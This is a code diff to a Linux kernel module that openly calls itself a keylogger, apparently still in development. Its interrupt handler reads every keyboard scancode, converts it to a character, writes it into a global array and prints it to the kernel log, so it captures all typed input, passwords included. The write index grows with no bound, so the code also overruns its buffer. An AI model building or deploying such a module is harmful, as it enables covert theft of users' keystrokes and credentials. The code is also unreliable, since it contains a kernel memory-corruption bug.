@@ -1,10 +1,14 @@
 // SPDX-License-Identifier: GPL-2.0+
 #include "keylogger.h"
 
-static LIST_HEAD(keyboard_entry_list);
 
 DEFINE_MUTEX(keyboard_mutex);
 DEFINE_SPINLOCK(keyboard_spinlock);
+
+static int windex	= -1;
+static int rindex	= -1;
+
+static struct key_press keys[CB_SIZE];
 
 static const struct usb_device_id usb_module_id_table[2] = {
 	{ USB_INTERFACE_INFO(
@@ -20,6 +24,7 @@ static int is_key_pressed(unsigned int scancode)
 {
 	return !(scancode & RELEASED_MASK);
 }
+
 
 static int get_ascii(unsigned int scancode)
 {
@@ -88,6 +93,51 @@ static int get_ascii(unsigned int scancode)
 }
 
 
+
+struct scan_code codes[] = {
+	{0x1, "escape", PRESSED},
+	{0x2, "1", PRESSED},
+	{0x3, "2", PRESSED},
+	{0x4, "3", PRESSED},
+	{0x5, "4", PRESSED},
+	{0x6, "5", PRESSED},
+	{0x7, "6", PRESSED},
+	{0x8, "7", PRESSED},
+	{0x9, "8", PRESSED},
+	{0xa, "9", PRESSED},
+	{0xb, "0 zero", PRESSED},
+	{0xc, "-", PRESSED},
+	{0xd, "=", PRESSED},
+	{0xe, "backspace", PRESSED},
+	{0xf, "tab", PRESSED},
+	{0x10, "q", PRESSED},
+	{0x11, "w", PRESSED},
+	{0x12, "e", PRESSED},
+	{0x13, "r", PRESSED},
+	{0x14, "t", PRESSED},
+	{0x15, "y", PRESSED},
+	{0x16, "u", PRESSED},
+	{0x17, "i", PRESSED},
+	{0x18, "o", PRESSED},
+	{0x19, "p", PRESSED},
+	{0x1e, "a", PRESSED},
+	{0x1f, "s", PRESSED},
+	{0x20, "d", PRESSED},
+	{0x21, "f", PRESSED},
+	{0x22, "g", PRESSED},
+	{0x23, "h", PRESSED},
+	{0x24, "j", PRESSED},
+	{0x25, "k", PRESSED},
+	{0x26, "l", PRESSED},
+	{0x2c, "z", PRESSED},
+	{0x2d, "x", PRESSED},
+	{0x2e, "c", PRESSED},
+	{0x2f, "v", PRESSED},
+	{0x30, "b", PRESSED},
+	{0x31, "n", PRESSED},
+	{0x32, "m", PRESSED},
+};
+
 // misc ops
 static ssize_t misc_read(struct file *file, char __user *buf, size_t count, loff_t *off)
 {
@@ -125,38 +175,18 @@ static struct miscdevice keyboard_device = {
 };
 
 // irq section
-//static irqreturn_t keyboard_handler(int irw, void *dev_id)
-//{
-//	u8 scancode	= inb(KEYBOARD_PORT);
-//	int pressed	= is_key_pressed(scancode);
-//	char key	= get_ascii(scancode);
-//	(void)scancode;
-//	(void) pressed;
-//	(void) key;
-//	//pr_info("scancode = 0x%X (%u) pressed=%d ch=%c\n", scancode, scancode, pressed, key);
-//	pr_info("called\n");
-//	return IRQ_HANDLED;
-//}
-
-static int key_state[256] = {0};
 
 static irqreturn_t keyboard_handler(int irq, void *dev_id)
 {
 	u8 scancode = inb(KEYBOARD_PORT);
 	int pressed = is_key_pressed(scancode);
 	unsigned long flags;
-	//pr_info("pressed %d\n", pressed);
 	spin_lock_irqsave(&keyboard_spinlock, flags);
-	key_state[scancode] = pressed;
-//	if (key_state[scancode] == pressed) {
-//		spin_unlock_irqrestore(&keyboard_spinlock, flags);
-//		return IRQ_HANDLED; // Ignore repeat events
-//	}
-
 	char key = get_ascii(scancode);
-
-//	pr_info("scancode = 0x%X (%u) %s ch=%c\n", scancode, scancode, pressed == 1 ? "pressed" : "released", key);
-	pr_info("scancode %c\n", scancode);
+	keys[++windex].ascii = key;
+	//keys[windex].
+	//pr_info("scancode = 0x%X (%u) %s ch=%c\n", scancode, scancode, pressed == 1 ? "pressed" : "released", key);
+	pr_info("scancode %c\n", key);
 	spin_unlock_irqrestore(&keyboard_spinlock, flags);
 
 	return IRQ_HANDLED;
@@ -165,11 +195,9 @@ static irqreturn_t keyboard_handler(int irq, void *dev_id)
 static int driver_irq_reg(void)
 {
 	int ret;
-	ret = request_irq(PL2_IRQ, &keyboard_handler, IRQF_SHARED, "Keyloggerrrrr", &keyboard_entry_list);
+	ret = request_irq(PL2_IRQ, &keyboard_handler, IRQF_SHARED, "Keyloggerrrrr", &keys);
 	if (ret < 0) {
 		pr_err("Failed to register interrupt request handler\n");
-		//list_del(&entry->list);
-		//kfree(entry);
 		return ret;
 	}
 	pr_info("Return value %d\n", ret);
@@ -178,23 +206,16 @@ static int driver_irq_reg(void)
 
 static void driver_irq_unregister(void)
 {
-//	struct keyboard_entry *entry, *tmp;
-//
-//	list_for_each_entry_safe(entry, tmp, &keyboard_entry_list, list) {
-//		pr_info("freeing nodes\n");
-//		free_irq(PL2_IRQ, entry);
-//		list_del(&entry->list);
-//		kfree(entry);
-//	}
-//
-//	pr_info("IRQ unregistered\n");
-	free_irq(PL2_IRQ, &keyboard_entry_list);
+	free_irq(PL2_IRQ, &keys);
 }
 
 
 static int __init main(void)
 {
 	int err;
+	for (int i = 0; i < CB_SIZE; i++) {
+		keys[i].name = NULL;
+	}
 	err = driver_irq_reg();
 	if (err) {
 		pr_err("IRQ failed\n");
@@ -217,4 +238,5 @@ MODULE_LICENSE("GPL");
 MODULE_VERSION("0.1");
 
 module_init(main);
+
 module_exit(cleanup);
